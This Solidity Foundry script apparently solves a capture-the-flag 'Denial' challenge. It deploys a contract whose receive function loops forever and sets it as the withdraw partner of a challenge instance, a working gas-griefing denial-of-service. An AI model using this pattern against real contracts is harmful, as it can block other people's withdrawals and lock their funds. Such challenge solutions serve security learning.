// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Denial.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract ReenterDeny {
    Denial public denial;
    uint256 counter = 1;

    constructor(Denial _denial) {
        denial = _denial;
    }

    receive() external payable {
        while (true) {
            counter += 1;
        }
    }
}

contract DenialSolution is Script {
    Denial constant denialInstance =
        Denial(payable(0x7A0f3092687Ae1f7712B6f24cCf1d12Faae72D66));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        ReenterDeny reenterDeny = new ReenterDeny(denialInstance);
        denialInstance.setWithdrawPartner(address(reenterDeny));
        // denialInstance.withdraw();
        vm.stopBroadcast();
    }
}
